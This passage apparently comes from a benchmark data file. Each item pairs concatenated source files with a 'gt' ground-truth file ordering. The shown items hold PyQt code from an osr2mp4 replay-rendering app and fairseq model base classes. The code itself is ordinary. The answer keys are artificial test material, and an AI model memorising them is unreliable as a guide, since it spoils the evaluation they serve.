            "'osr2mp4-app/main.py'",
            "'osr2mp4-app/BaseComponents/Buttons.py'",
            "'osr2mp4-app/helper/helper.py'"
        ],
        "content": "'osr2mp4-app/HomeComponents/Logo.py'\n:from BaseComponents.Buttons import Button\n\n\nclass Logo(Button):\n\tdef __init__(self, parent):\n\t\tsuper(Logo, self).__init__(parent)\n\n\t\tself.default_x = 20\n\t\tself.default_y = 30\n\t\tself.default_size = 3.5\n\n\t\tself.img_idle = \"res/OsrLogo.png\"\n\t\tself.img_hover = \"res/OsrLogo.png\"\n\t\tself.img_click = \"res/OsrLogo.png\"\n\t\tself.img_shadow = \"res/OsrLogo_Shadow.png\"\n\t\tsuper().setup()\n\n'osr2mp4-app/main.py'\n:import logging\nimport os\nimport os.path\nimport sys\nimport traceback\nimport PyQt5\nfrom PyQt5 import QtGui, QtCore\nfrom PyQt5.QtWidgets import QMainWindow, QApplication\nfrom autologging import TRACE\nfrom urllib.parse import urlparse\n\nfrom osr2mp4.Utils.getmods import mod_string_to_enums\nfrom osr2mp4.osrparse.replay import Replay\n\nfrom HomeComponents.AutoCheckBox import AutoCheckBox\nfrom HomeComponents.Buttons.FolderButton import FolderButton\nfrom HomeComponents.Buttons.MapsetButton import MapsetButton\nfrom HomeComponents.Buttons.Options import Options\nfrom HomeComponents.Buttons.OsrButton import OsrButton\nfrom HomeComponents.Buttons.OsrGrayButton import OsrGrayButton\nfrom HomeComponents.Buttons.OutputButton import OutputButton\nfrom HomeComponents.Buttons.StartButton import StartButton\nfrom HomeComponents.Buttons.UpdateButton import UpdateButton\nfrom HomeComponents.Buttons.osuButton import osuButton\nfrom HomeComponents.Buttons.CancelButton import CancelButton\nfrom HomeComponents.Buttons.osuMapButton import osuMapButton\nfrom HomeComponents.LanguageDropDown import LanguageDropDown\nfrom HomeComponents.Logo import Logo\nfrom HomeComponents.PathImage import OsrPath, MapSetPath\nfrom HomeComponents.PopupWindow import PopupWindow, CustomTextWindow\nfrom HomeComponents.ProgressBar import ProgressBar\nfrom HomeComponents.SkinDropDown import SkinDropDown\nfrom Info import Info\nfrom BaseComponents.Buttons import ButtonBrowse, PopupButton\nfrom SettingComponents.Layouts.SettingsPage import SettingsPage\nfrom abspath import abspath, configpath, Log\nfrom config_data import current_config, current_settings\nfrom helper.helper import kill, cleanupkill, get_latest_replay, get_right_map\nfrom helper.osudatahelper import parse_osr, parse_map\nfrom helper.datahelper import save\n\n\nclass Window(QMainWindow):\n\tdef __init__(self, App, execpath):\n\t\tsuper().__init__()\n\n\t\tlogging.basicConfig(level=TRACE, filename=Log.apppath, filemode=\"w\",\n\t\t                    format=\"%(asctime)s:%(levelname)s:%(name)s:%(funcName)s:%(message)s\")\n\n\t\tapikey = current_settings[\"api key\"]\n\t\tcurrent_settings[\"api key\"] = None\n\t\tlogging.info(\"Current settings is updated to: {}\".format(current_settings))\n\t\tcurrent_settings[\"api key\"] = apikey\n\n\t\tlogging.info(\"Current config is updated to: {}\".format(current_config))\n\n\t\tself.setFocus()\n\t\tApp.applicationStateChanged.connect(self.applicationStateChanged)\n\t\tself.setWindowIcon(QtGui.QIcon(os.path.join(abspath, \"res/OsrLogo.png\")))\n\t\tself.setWindowTitle(\"osr2mp4\")\n\t\tself.setStyleSheet(\"background-color: rgb(30, 30, 33);\")\n\t\tself.setAcceptDrops(True)\n\n\t\twindow_width, window_height = 832, 469\n\n\t\tself.execpath = execpath\n\t\tself.minimum_resolution = [640, 360]\n\t\tself.previous_resolution = [0, 0]\n\t\tself.default_width, self.default_height = window_width, window_height\n\n\t\tself.popup_bool = True\n\t\tself.clicked_inside = False\n\t\tself.prevreplay = \"\"\n\n\t\tself.osrbutton = OsrButton(self)\n\t\tself.mapsetbutton = MapsetButton(self)\n\t\tself.startbutton = StartButton(self)\n\t\tself.logo = Logo(self)\n\t\tself.osrpath = OsrPath(self)\n\t\tself.mapsetpath = MapSetPath(self)\n\t\tself.skin_dropdown = SkinDropDown(self)\n\t\tself.options = Options(self)\n\t\tself.updatebutton = UpdateButton(self)\n\t\tself.folderbutton = FolderButton(self)\n\t\tself.osrgraybutton = OsrGrayButton(self)\n\t\tself.osumapbutton = osuMapButton(self)\n\t\tself.autocheckbox = AutoCheckBox(self)\n\t\tself.cancelbutton = CancelButton(self)\n\n\t\tlogging.info(\"Loaded Buttons\")\n\n\t\tself.blurrable_widgets = [self.osrbutton, self.mapsetbutton, self.startbutton, self.logo, self.osrpath,\n\t\t                          self.mapsetpath, self.options, self.skin_dropdown, self.cancelbutton, self.folderbutton, self.autocheckbox]\n\n\t\tself.langs_dropdown = LanguageDropDown(self)\n\t\tself.popup_window = PopupWindow(self)\n\t\tself.output_window = OutputButton(self)\n\t\tself.osu_window = osuButton(self)\n\n\n\t\tself.customwindow = CustomTextWindow(self)\n\t\tself.customwindow.hide()\n\n\t\tlogging.info(\"Loaded Popupwindow output button and osu button\")\n\t\tself.settingspage = SettingsPage(self)\n\n\t\tlogging.info(\"Loaded settings page\")\n\n\t\tself.popup_widgets = [self.popup_window, self.output_window, self.osu_window]\n\n\t\tself.progressbar = ProgressBar(self)\n\t\tself.progressbar.hide()\n\n\t\tcurrent_config[\".osr path\"] = \"brrrrr\"\n\t\tself.check_osu_path()\n\n\n\t\tself.show()\n\n\n\t\tif getattr(self.progressbar, 'taskbar_btn', None):\n\t\t\tself.progressbar.taskbar_btn.setWindow(self.windowHandle())\n\n\t\tself.resize(window_width, window_height)\n\n\tdef toggle_auto(self, enable_auto):\n\t\tif enable_auto:\n\t\t\tself.prevreplay = \"auto\"\n\t\t\tself.setreplay(\"auto\")\n\t\t\tself.setmap(\"\")\n\n\t\t\tInfo.replay = Replay()\n\t\t\tInfo.replay.mod_combination = mod_string_to_enums(current_settings[\"Custom mods\"])\n\t\t\tInfo.map = None\n\t\t\tInfo.maphash = None\n\n\t\t\tself.osrgraybutton.show()\n\t\t\tself.osrbutton.hide()\n\n\t\t\tself.mapsetbutton.hide()\n\t\t\tself.osumapbutton.show()\n\t\telse:\n\t\t\tself.setreplay(\"\")\n\t\t\tself.setmap(\"\")\n\n\t\t\tcurrent_settings[\"Custom mods\"] = \"\"\n\t\t\tcurrent_config[\".osr path\"] = \"\"\n\t\t\tcurrent_config[\"Beatmap path\"] = \"\"\n\t\t\tInfo.replay = None\n\t\t\tInfo.real_mod = None\n\t\t\tInfo.map = None\n\t\t\tInfo.maphash = None\n\n\t\t\tself.check_replay_map()\n\n\t\t\tself.osrgraybutton.hide()\n\t\t\tself.osrbutton.show()\n\n\t\t\tself.mapsetbutton.show()\n\t\t\tself.osumapbutton.hide()\n\n\tdef applicationStateChanged(self, state):\n\t\tif ButtonBrowse.browsing or PopupButton.browsing:\n\t\t\tButtonBrowse.browsing = False\n\t\t\tPopupButton.browsing = False\n\t\t\treturn\n\t\tif state == 4:\n\t\t\tself.check_replay_map()\n\n\tdef resizeEvent(self, event):\n\t\theight = self.width() * 9 / 16\n\t\tself.resize(self.width(), height)\n\t\tif self.width() < self.minimum_resolution[0] and self.height() < self.minimum_resolution[1]:\n\t\t\tself.resize(self.previous_resolution[0], self.previous_resolution[1])\n\n\t\tself.osrbutton.changesize()\n\t\tself.mapsetbutton.changesize()\n\t\tself.startbutton.changesize()\n\t\tself.logo.changesize()\n\t\tself.osrpath.changesize()\n\t\tself.mapsetpath.changesize()\n\t\tself.output_window.changesize()\n\t\tself.osu_window.changesize()\n\t\tself.popup_window.changesize()\n\t\tself.skin_dropdown.changesize()\n\t\tself.settingspage.changesize()\n\t\tself.options.changesize()\n\t\tself.progressbar.changesize()\n\t\tself.customwindow.changesize()\n\t\tself.updatebutton.changesize()\n\t\tself.cancelbutton.changesize()\n\t\tself.folderbutton.changesize()\n\t\tself.autocheckbox.changesize()\n\t\tself.osrgraybutton.changesize()\n\t\tself.osumapbutton.changesize()\n\t\tself.langs_dropdown.changesize()\n\n\t\tif self.popup_bool:\n\t\t\tself.blur_function(True)\n\t\telse:\n\t\t\tself.blur_function(False)\n\n\t\tself.previous_resolution[0] = self.width()\n\t\tself.previous_resolution[1] = self.height()\n\n\tdef keyPressEvent(self, event):\n\t\tif event.key() == QtCore.Qt.Key_Escape:\n\t\t\tself.hidesettings()\n\n\tdef mousePressEvent(self, QMouseEvent):\n\t\tself.hidesettings()\n\n\tdef hidesettings(self):\n\t\tif self.settingspage.isVisible():\n\t\t\tself.settingspage.hide()\n\t\t\tself.settingspage.settingsarea.scrollArea.hide()\n\n\t\t\tsave()\n\n\t\tif self.customwindow.isVisible():\n\t\t\tself.customwindow.hide()\n\n\tdef blur_function(self, blur):\n\t\tif blur:\n\t\t\tfor x in self.blurrable_widgets:\n\t\t\t\tx.blur_me(True)\n\t\t\t\tx.clickable = False\n\t\telse:\n\t\t\tfor x in self.blurrable_widgets:\n\t\t\t\tx.blur_me(False)\n\t\t\t\tx.clickable = True\n\n\tdef delete_popup(self):\n\t\tfor x in self.popup_widgets:\n\t\t\tx.setParent(None)\n\n\tdef check_osu_path(self):\n\t\tif os.path.isfile(configpath):\n\t\t\tself.skin_dropdown.get_skins()\n\t\t\tif current_config[\"Output path\"] != \"\" and current_config[\"osu! path\"] != \"\":\n\t\t\t\tself.delete_popup()\n\t\t\t\tself.popup_bool = False\n\n\t\tif current_config[\".osr path\"] == \"auto\":\n\t\t\tcurrent_settings[\"Custom mods\"] = \"\"\n\n\t\tsave()\n\n\t\tif not self.popup_bool:\n\t\t\tself.settingspage.load_settings()\n\t\telse:\n\t\t\tself.settingspage.settingsarea.scrollArea.hide()\n\n\tdef setreplay(self, replay_path):\n\t\tif replay_path is None or replay_path == \"\":\n\t\t\treturn\n\n\t\treplay_name = os.path.split(replay_path)[-1]\n\t\tself.osrpath.setText(replay_name)\n\n\t\tcurrent_config[\".osr path\"] = replay_path\n\t\tparse_osr(current_config, current_settings)\n\t\tlogging.info(\"Updated replay path to: {}\".format(replay_path))\n\n\tdef setmap(self, mapset_path):\n\t\tif mapset_path is None or mapset_path == \"\":\n\t\t\treturn\n\t\tcurrent_config[\"Beatmap path\"] = mapset_path\n\t\tmap_name = os.path.split(mapset_path)[-1]\n\t\tself.mapsetpath.setText(map_name)\n\n\t\tparse_map(current_config, current_settings)\n\t\tlogging.info(\"Updated beatmap path to: {}\".format(mapset_path))\n\n\tdef check_replay_map(self):\n\t\tif current_config[\".osr path\"] == \"auto\":\n\t\t\treturn\n\n\t\treplay = get_latest_replay()\n\t\tif self.prevreplay == replay or replay is None:\n\t\t\treturn\n\t\tself.prevreplay = replay\n\n\t\tself.setreplay(replay)\n\n\t\tmapset = get_right_map(replay)\n\t\tif mapset is None:\n\t\t\treturn\n\t\tself.setmap(mapset)\n\n\tdef dragEnterEvent(self, e):\n\t\te.accept()\n\n\tdef dropEvent(self, e):\n\t\tfor url in e.mimeData().urls():\n\t\t\tp = urlparse(url.url())\n\t\t\tfinal_path = os.path.abspath(os.path.join(p.netloc, p.path))\n\t\t\tif final_path.endswith(\".osr\"):\n\t\t\t\tself.setreplay(final_path)\n\t\t\t\tmapset = get_right_map(final_path)\n\t\t\t\tif mapset is not None:\n\t\t\t\t\tself.setmap(mapset)\n\n\t\t\telif os.path.isdir(final_path):\n\t\t\t\tself.setmap(final_path)\n\n\t\t\telif final_path.endswith(\".osu\"):\n\t\t\t\tif current_config[\".osr path\"] != \"auto\":\n\t\t\t\t\tfinal_path = os.path.dirname(final_path)\n\t\t\t\tself.setmap(final_path)\n\n\ndef excepthook(exc_type, exc_value, exc_tb):\n\ttb = traceback.format_exc() + \" \" + \"\".join(traceback.format_exception(exc_type, exc_value, exc_tb))\n\tlogging.exception(tb)\n\tprint(tb)\n\tQApplication.quit()\n\n\ndef main(execpath=\".\"):\n\tsys.excepthook = excepthook\n\tfloop = open(os.path.join(execpath, \"exit.txt\"), \"w\")\n\tfloop.write(\"0\")\n\tfloop.close()\n\n\texecpath = os.path.abspath(execpath)\n\n\tif not os.path.isdir(os.path.join(execpath, \"Logs\")):\n\t\tos.mkdir(os.path.join(execpath, \"Logs\"))\n\n\tLog.apppath = os.path.join(execpath, \"Logs\", Log.apppath)\n\tLog.runosupath = os.path.join(execpath, \"Logs\", Log.runosupath)\n\n\tqtpath = os.path.dirname(PyQt5.__file__)\n\tpluginpath = os.path.join(qtpath, \"Qt/plugins\")\n\tos.environ['QT_QPA_PLATFORM_PLUGIN_PATH'] = pluginpath\n\n\tApp = QApplication(sys.argv)\n\twindow = Window(App, execpath)\n\tb = open(os.path.join(abspath, \"progress.txt\"), \"w\")\n\tb.close()\n\twatcher = QtCore.QFileSystemWatcher([os.path.join(abspath, 'progress.txt')])\n\twatcher.directoryChanged.connect(window.progressbar.directory_changed)\n\twatcher.fileChanged.connect(window.progressbar.file_changed)\n\n\tb = open(\"error.txt\", \"w\")\n\tb.close()\n\terrorwatcher = QtCore.QFileSystemWatcher(['error.txt'])\n\terrorwatcher.directoryChanged.connect(window.customwindow.directory_changed)\n\terrorwatcher.fileChanged.connect(window.customwindow.file_changed)\n\n\tret = App.exec_()\n\tif window.startbutton.proc is not None and window.startbutton.proc.poll() is None:\n\t\tkill(window.startbutton.proc.pid)\n\t\tcleanupkill()\n\t\twith open(\"progress.txt\", \"w\") as file:\n\t\t\tfile.write(\"done\")\n\t\tfile.close()\n\n\tsys.exit(ret)\n\n\nif __name__ == \"__main__\":\n\tmain()\n\n'osr2mp4-app/BaseComponents/Buttons.py'\n:import os\n\nfrom PyQt5 import QtGui, QtCore\nfrom PyQt5.QtWidgets import QGraphicsBlurEffect, QPushButton, QFileDialog\nfrom pathlib import Path\n\nfrom autologging import traced, logged\n\nfrom abspath import abspath, configpath\nfrom config_data import current_config, current_settings\nfrom helper.helper import getsize, changesize\nfrom helper.datahelper import save\nfrom helper.username_parser import get_config_info, settings_translator\nimport logging\n\n\ndef get_shadowpos(button, width, height):\n\tmiddle_x = button.x() + button.width() / 2\n\tmiddle_y = button.y() + button.height() / 2\n\n\tshadow_x = middle_x - width / 2\n\tshadow_y = middle_y - height / 2\n\n\treturn shadow_x, shadow_y\n\n\nclass Button(QPushButton):\n\tdef __init__(self, parent):\n\t\tself.main_window = parent\n\n\t\tself.shadow = QPushButton(self.main_window)\n\t\tsuper(Button, self).__init__(parent)\n\t\tself.blur_effect = None\n\t\tself.clickable = True\n\t\tself.default_width, self.default_height = None, None\n\t\tself.default_shadowwidth, self.default_shadowheight = None, None\n\t\tself.img_shadow = None\n\n\tdef setup(self):\n\n\t\tself.img_idle = os.path.join(abspath, self.img_idle)\n\t\tself.img_hover = os.path.join(abspath, self.img_hover)\n\t\tself.img_click = os.path.join(abspath, self.img_click)\n\n\t\tif self.img_shadow is not None:\n\t\t\tself.setup_shadow()\n\t\telse:\n\t\t\tself.shadow.setParent(None)\n\t\t\tself.shadow = None\n\n\t\tself.setIcon(QtGui.QIcon(self.img_idle))\n\t\tself.setStyleSheet()\n\n\t\timgsize = getsize(self.img_idle)\n\n\t\tself.setMaximumWidth(imgsize[0])\n\t\tself.setMaximumHeight(imgsize[1])\n\n\t\twidth = self.default_size * imgsize[0] / 10\n\t\theight = self.default_size * imgsize[1] / 10\n\n\t\tself.default_width, self.default_height = width, height\n\n\t\tself.setIconSize(QtCore.QSize(width, height))\n\t\tself.setGeometry(self.default_x, self.default_y, width, height)\n\t\tself.setFlat(True)\n\t\tself.blur_effect = QGraphicsBlurEffect()\n\t\tself.blur_effect.setBlurRadius(0)\n\t\tself.setGraphicsEffect(self.blur_effect)\n\n\tdef setup_shadow(self):\n\n\t\tself.img_shadow = os.path.join(abspath, self.img_shadow)\n\n\t\timgsize = getsize(self.img_shadow)\n\n\t\twidth = self.default_size * imgsize[0] / 10 * 1.01\n\t\theight = self.default_size * imgsize[1] / 10 * 1.01\n\n\t\tself.default_shadowwidth, self.default_shadowheight = width, height\n\t\tself.shadow.setIcon(QtGui.QIcon(self.img_shadow))\n\t\tself.shadow.setStyleSheet()\n\t\tself.shadow.setIconSize(QtCore.QSize(width, height))\n\t\tx, y = get_shadowpos(self, width, height)\n\t\tself.shadow.setGeometry(x, y, width, height)\n\t\tself.shadow.setFlat(True)\n\n\tdef blur_me(self, blur):\n\t\tif blur:\n\t\t\tself.blur_effect.setBlurRadius(25)\n\t\telse:\n\t\t\tself.blur_effect.setBlurRadius(0)\n\n\tdef mousePressEvent(self, QEvent):\n\t\tif self.clickable:\n\t\t\tself.setIcon(QtGui.QIcon(self.img_click))\n\n\tdef mouseReleaseEvent(self, QEvent):\n\t\tif self.clickable:\n\t\t\tself.mouseclicked()\n\t\t\tself.setIcon(QtGui.QIcon(self.img_idle))\n\n\tdef enterEvent(self, QEvent):\n\t\tif self.clickable:\n\t\t\tself.setIcon(QtGui.QIcon(self.img_hover))\n\n\tdef leaveEvent(self, QEvent):\n\t\tself.setIcon(QtGui.QIcon(self.img_idle))\n\n\tdef mouseclicked(self):\n\t\tpass\n\n\tdef setParent(self, parent):\n\t\tsuper().setParent(parent)\n\t\tif self.shadow is not None:\n\t\t\tself.shadow.setParent(parent)\n\n\tdef changesize(self):\n\t\tchangesize(self)\n\n\t\tif self.shadow is not None:\n\t\t\tscale = self.main_window.height() / self.main_window.default_height\n\t\t\twidth = self.default_shadowwidth * scale\n\t\t\theight = self.default_shadowheight * scale\n\t\t\tself.shadow.setIconSize(QtCore.QSize(width, height))\n\t\t\tx, y = get_shadowpos(self, width, height)\n\t\t\tself.shadow.setGeometry(x, y, width, height)\n\n\nclass ButtonBrowse(Button):\n\tbrowsing = False\n\n\tdef __init__(self, parent):\n\t\tsuper(ButtonBrowse, self).__init__(parent)\n\t\tself.browsepath = str(Path.home())\n\t\tself.file_type = \"\"\n\n\tdef mouseclicked(self):\n\t\tfile_name = \"\"\n\t\tself.browsing = True\n\t\tif self.file_type == \"Folder\":\n\t\t\tfile_name = QFileDialog.getExistingDirectory(None, \"Select Directory\", self.browsepath)\n\t\telse:\n\t\t\tfile_name = QFileDialog.getOpenFileName(self, 'Open file', self.browsepath,\n\t\t\t                                        \"{} files (*{})\".format(self.file_type, self.file_type))[0]\n\t\tlogging.info(\"Updated: {}\".format(current_config))\n\t\tself.afteropenfile(file_name)\n\n\tdef afteropenfile(self, filename):\n\t\tpass\n\n\n@logged(logging.getLogger(__name__))\n@traced\nclass PopupButton(ButtonBrowse):\n\tdef afteropenfile(self, filename):\n\t\tif filename == \"\":\n\t\t\treturn\n\t\tif current_config[\"Output path\"] != \"\" and current_config[\"osu! path\"] != \"\":\n\t\t\tlogging.info(\"entering output\")\n\t\t\tself.main_window.delete_popup()\n\t\t\tself.main_window.popup_bool = False\n\n\t\t\tself.main_window.check_replay_map()\n\t\t\tself.main_window.resizeEvent(True)\n\n\t\t\tself.main_window.skin_dropdown.set_skin_osu()\n\t\t\tself.main_window.skin_dropdown.get_skins()\n\t\t\tlogging.info(configpath)\n\n\t\t\tself.main_window.settingspage.load_settings()\n\n\t\t\tosusettings = get_config_info(current_config[\"osu! path\"])\n\n\t\t\tself.set_settings(osusettings)\n\n\t\t\tsave()\n\n\t\t\tself.main_window.osrbutton.browsepath = os.path.join(current_config[\"osu! path\"], \"Replays/\")\n\t\t\tself.main_window.mapsetbutton.browsepath = os.path.join(current_config[\"osu! path\"], \"Songs/\")\n\n\tdef set_settings(self, osusettings):\n\t\tlogging.info(f\"current settings {current_settings}\")\n\t\tlogging.info(f\"osu settings {osusettings}\")\n\t\tfor osukey in osusettings:\n\t\t\tmykey = settings_translator[osukey]\n\t\t\ttry:\n\t\t\t\tsetting = float(osusettings[osukey])\n\t\t\texcept ValueError:\n\t\t\t\tsetting = osusettings[osukey]\n\n\t\t\tcurrent_settings[mykey] = setting\n\n\t\tlogging.info(f\"current settings after set {current_settings}\")\n\n'osr2mp4-app/helper/helper.py'\n:import glob\nimport os\nimport shutil\nimport cv2\nimport psutil\nfrom PyQt5 import QtCore\nimport logging\nfrom config_data import current_config\nfrom helper.find_beatmap import find_beatmap_\n\n\ndef getsize(img):\n\ta = cv2.imread(img, -1)\n\tlogging.info(\"Image loaded: {}\".format(img))\n\treturn a.shape[1], a.shape[0]\n\n\ndef changesize(widget):\n\tscale = widget.main_window.height() / widget.main_window.default_height\n\n\tx = widget.default_x * scale\n\ty = widget.default_y * scale\n\n\twidth = widget.default_width * scale\n\theight = widget.default_height * scale\n\n\twidget.setIconSize(QtCore.QSize(width, height))\n\twidget.setGeometry(x, y, width, height)\n\n\ndef kill(proc_pid):\n\tprocess = psutil.Process(proc_pid)\n\tfor proc in process.children(recursive=True):\n\t\tproc.kill()\n\tprocess.kill()\n\n\ndef cleanupkill():\n\timport osr2mp4\n\tosr2mp4dir = os.path.dirname(osr2mp4.__file__)\n\tto_deletes = glob.glob(os.path.join(osr2mp4dir, \"*temp\"))\n\tfor folder in to_deletes:\n\t\tshutil.rmtree(folder, ignore_errors=True)\n\n\ndef get_latest_replay():\n\ttry:\n\t\tif current_config[\"osu! path\"] == \"\":\n\t\t\treturn\n\n\t\tpath = os.path.join(current_config[\"osu! path\"], \"Replays/*.osr\")\n\t\tlist_of_files = glob.glob(path)\n\t\tif not list_of_files:\n\t\t\treturn\n\t\treturn max(list_of_files, key=os.path.getctime)\n\n\n\n\texcept Exception as e:\n\t\tprint(\"Error: {}\".format(e))\n\t\tlogging.error(repr(e))\n\t\treturn None\n\n\ndef get_right_map(replay):\n\ttry:\n\t\tif current_config[\"osu! path\"] == \"\":\n\t\t\treturn\n\n\t\tbeatmap_name = find_beatmap_(replay, current_config[\"osu! path\"])\n\t\tbeatmap_path = os.path.join(current_config[\"osu! path\"], \"Songs\", beatmap_name)\n\n\t\tif not os.path.isdir(beatmap_path):\n\t\t\treturn None\n\n\t\treturn beatmap_path\n\n\texcept Exception as e:\n\t\tprint(\"Error: {}\".format(e))\n\t\tlogging.error(repr(e))\n\t\treturn None\n",
        "gt": [
            "'osr2mp4-app/helper/helper.py'",
            "'osr2mp4-app/BaseComponents/Buttons.py'",
            "'osr2mp4-app/HomeComponents/Logo.py'",
            "'osr2mp4-app/main.py'"
        ]
    },
    {
        "files": [
            "'emnlp2021-sixt/fairseq/models/fairseq_model.py'",
            "'emnlp2021-sixt/fairseq/models/composite_encoder.py'",
            "'emnlp2021-sixt/fairseq/models/__init__.py'"
        ],
        "content": "'emnlp2021-sixt/fairseq/models/fairseq_model.py'\n:\n\n\n\n\n\nimport logging\nfrom typing import Dict, List, Optional, Tuple\n\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom fairseq import utils\nfrom fairseq.checkpoint_utils import prune_state_dict\nfrom fairseq.data import Dictionary\nfrom fairseq.models import FairseqDecoder, FairseqEncoder\nfrom torch import Tensor\n\n\nlogger = logging.getLogger(__name__)\n\n\nclass BaseFairseqModel(nn.Module):\n\n\n    def __init__(self):\n        super().__init__()\n        self._is_generation_fast = False\n\n    @staticmethod\n    def add_args(parser):\n\n        pass\n\n    @classmethod\n    def build_model(cls, args, task):\n\n        raise NotImplementedError(\"Model must implement the build_model method\")\n\n    def get_targets(self, sample, net_output):\n\n        return sample[\"target\"]\n\n    def get_normalized_probs(\n        self,\n        net_output: Tuple[Tensor, Optional[Dict[str, List[Optional[Tensor]]]]],\n        log_probs: bool,\n        sample: Optional[Dict[str, Tensor]] = None,\n    ):\n\n        return self.get_normalized_probs_scriptable(net_output, log_probs, sample)\n\n\n\n\n\n    def get_normalized_probs_scriptable(\n        self,\n        net_output: Tuple[Tensor, Optional[Dict[str, List[Optional[Tensor]]]]],\n        log_probs: bool,\n        sample: Optional[Dict[str, Tensor]] = None,\n    ):\n\n        if hasattr(self, \"decoder\"):\n            return self.decoder.get_normalized_probs(net_output, log_probs, sample)\n        elif torch.is_tensor(net_output):\n            logits = net_output.float()\n            if log_probs:\n                return F.log_softmax(logits, dim=-1)\n            else:\n                return F.softmax(logits, dim=-1)\n        raise NotImplementedError\n\n    def extract_features(self, *args, **kwargs):\n\n        return self(*args, **kwargs)\n\n    def max_positions(self):\n\n        return None\n\n    def load_state_dict(self, state_dict, strict=True, args=None):\n        \"\"\"Copies parameters and buffers from *state_dict* into this module and\n        its descendants.\n\n        Overrides the method in :class:`nn.Module`. Compared with that method\n        this additionally \"upgrades\" *state_dicts* from old checkpoints.\n        Upgrade old state dicts to work with newer code.\"\"\"\n        self.upgrade_state_dict_named(state_dict, \"\")\n\n    def upgrade_state_dict_named(self, state_dict, name):\n\n        assert state_dict is not None\n\n        def do_upgrade(m, prefix):\n            if len(prefix) > 0:\n                prefix += \".\"\n\n            for n, c in m.named_children():\n                name = prefix + n\n                if hasattr(c, \"upgrade_state_dict_named\"):\n                    c.upgrade_state_dict_named(state_dict, name)\n                elif hasattr(c, \"upgrade_state_dict\"):\n                    c.upgrade_state_dict(state_dict)\n                do_upgrade(c, name)\n\n        do_upgrade(self, name)\n\n    def set_num_updates(self, num_updates):\n\n\n        def _apply(m):\n            if hasattr(m, 'set_num_updates') and m != self:\n                m.set_num_updates(num_updates)\n        self.apply(_apply)\n\n    def prepare_for_inference_(self, args):\n\n        kwargs = {}\n        kwargs['beamable_mm_beam_size'] = (\n            None if getattr(args, 'no_beamable_mm', False)\n            else getattr(args, 'beam', 5)\n        )\n        kwargs['need_attn'] = getattr(args, 'print_alignment', False)\n        if hasattr(args, 'retain_dropout'):\n            kwargs['retain_dropout'] = args.retain_dropout\n            kwargs['retain_dropout_modules'] = getattr(\n                args, 'retain_dropout_modules', None\n            )\n        self.make_generation_fast_(**kwargs)\n\n    def make_generation_fast_(self, **kwargs):\n\n        if self._is_generation_fast:\n            return\n        self._is_generation_fast = True\n\n\n        def apply_remove_weight_norm(module):\n            try:\n                nn.utils.remove_weight_norm(module)\n            except ValueError:\n                return\n\n        self.apply(apply_remove_weight_norm)\n\n        def apply_make_generation_fast_(module, prefix):\n            if len(prefix) > 0:\n                prefix += \".\"\n\n            base_func = BaseFairseqModel.make_generation_fast_\n            for n, m in module.named_modules():\n                if (\n                    m != self\n                    and hasattr(m, \"make_generation_fast_\")\n\n\n                    and m.make_generation_fast_.__func__ is not base_func\n                ):\n                    name = prefix + n\n                    m.make_generation_fast_(name=name, **kwargs)\n\n        apply_make_generation_fast_(self, \"\")\n\n        def train(mode=True):\n            if mode:\n                raise RuntimeError(\"cannot train after make_generation_fast\")\n\n\n        self.eval()\n        self.train = train\n\n    def prepare_for_onnx_export_(self, **kwargs):\n\n        seen = set()\n\n        def apply_prepare_for_onnx_export_(module):\n            if (\n                module != self\n                and hasattr(module, \"prepare_for_onnx_export_\")\n                and module not in seen\n            ):\n                seen.add(module)\n                module.prepare_for_onnx_export_(**kwargs)\n\n        self.apply(apply_prepare_for_onnx_export_)\n\n    def prepare_for_tpu_(self, **kwargs):\n\n        seen = set()\n\n        def apply_prepare_for_tpu_(module):\n            if (\n                module != self\n                and hasattr(module, \"prepare_for_tpu_\")\n                and module not in seen\n            ):\n                seen.add(module)\n                module.prepare_for_tpu_(**kwargs)\n\n        self.apply(apply_prepare_for_tpu_)\n\n    @classmethod\n    def from_pretrained(\n        cls,\n        model_name_or_path,\n        checkpoint_file=\"model.pt\",\n        data_name_or_path=\".\",\n        **kwargs,\n    ):\n\n        from fairseq import hub_utils\n\n        x = hub_utils.from_pretrained(\n            model_name_or_path,\n            checkpoint_file,\n            data_name_or_path,\n            archive_map=cls.hub_models(),\n            **kwargs,\n        )\n        logger.info(x[\"args\"])\n        return hub_utils.GeneratorHubInterface(x[\"args\"], x[\"task\"], x[\"models\"])\n\n    @classmethod\n    def hub_models(cls):\n        return {}\n\n\nclass FairseqEncoderDecoderModel(BaseFairseqModel):\n\n\n    def __init__(self, encoder, decoder):\n        super().__init__()\n\n        self.encoder = encoder\n        self.decoder = decoder\n        assert isinstance(self.encoder, FairseqEncoder)\n        assert isinstance(self.decoder, FairseqDecoder)\n\n    def forward(self, src_tokens, src_lengths, prev_output_tokens, **kwargs):\n\n        encoder_out = self.encoder(src_tokens, src_lengths=src_lengths, **kwargs)\n        decoder_out = self.decoder(\n            prev_output_tokens, encoder_out=encoder_out, **kwargs\n        )\n        return decoder_out\n\n    def forward_decoder(self, prev_output_tokens, **kwargs):\n        return self.decoder(prev_output_tokens, **kwargs)\n\n    def extract_features(self, src_tokens, src_lengths, prev_output_tokens, **kwargs):\n\n        encoder_out = self.encoder(src_tokens, src_lengths=src_lengths, **kwargs)\n        features = self.decoder.extract_features(\n            prev_output_tokens, encoder_out=encoder_out, **kwargs\n        )\n        return features\n\n    def output_layer(self, features, **kwargs):\n\n        return self.decoder.output_layer(features, **kwargs)\n\n    def max_positions(self):\n\n        return (self.encoder.max_positions(), self.decoder.max_positions())\n\n    def max_decoder_positions(self):\n\n        return self.decoder.max_positions()\n\n\nclass FairseqModel(FairseqEncoderDecoderModel):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        utils.deprecation_warning(\n            \"FairseqModel is deprecated, please use FairseqEncoderDecoderModel \"\n            \"or BaseFairseqModel instead\",\n            stacklevel=4,\n        )\n\n\nclass FairseqMultiModel(BaseFairseqModel):\n\n\n    def __init__(self, encoders, decoders):\n        super().__init__()\n        assert encoders.keys() == decoders.keys()\n        self.keys = list(encoders.keys())\n        for key in self.keys:\n            assert isinstance(encoders[key], FairseqEncoder)\n            assert isinstance(decoders[key], FairseqDecoder)\n\n        self.models = nn.ModuleDict(\n            {\n                key: FairseqEncoderDecoderModel(encoders[key], decoders[key])\n                for key in self.keys\n            }\n        )\n\n    @staticmethod\n    def build_shared_embeddings(\n        dicts: Dict[str, Dictionary],\n        langs: List[str],\n        embed_dim: int,\n        build_embedding: callable,\n        pretrained_embed_path: Optional[str] = None,\n    ):\n\n        shared_dict = dicts[langs[0]]\n        if any(dicts[lang] != shared_dict for lang in langs):\n            raise ValueError(\n                